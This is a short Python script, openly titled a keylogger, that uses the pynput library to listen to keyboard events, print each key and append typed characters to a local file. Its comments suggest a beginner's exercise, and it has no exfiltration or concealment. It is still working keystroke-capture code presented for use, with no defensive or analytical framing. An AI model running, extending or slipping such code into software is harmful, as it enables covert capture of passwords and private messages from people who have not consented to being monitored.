# python keylogger
from pynput import keyboard 

def keyPressed(key):
    print(str(key)) # prints the key to ourselves
    with open("keyfile.txt", 'a') as logKey: # make and append 'a' new file with new info each time 
        try: # first try to put key into character to put into a file 
            char = key.char
            logKey.write(char)
        except: 
            print("Error getting char")


if __name__ == "__main__": # if the main method is ready, 
    listener = keyboard.Listener(on_press=keyPressed) # a listner is an object that we pass parameters, 
    #On press parameter where ever directed to is where event will be sent
    listener.start()
    input() # ready to start asking for inputs and start capturing key events in terminal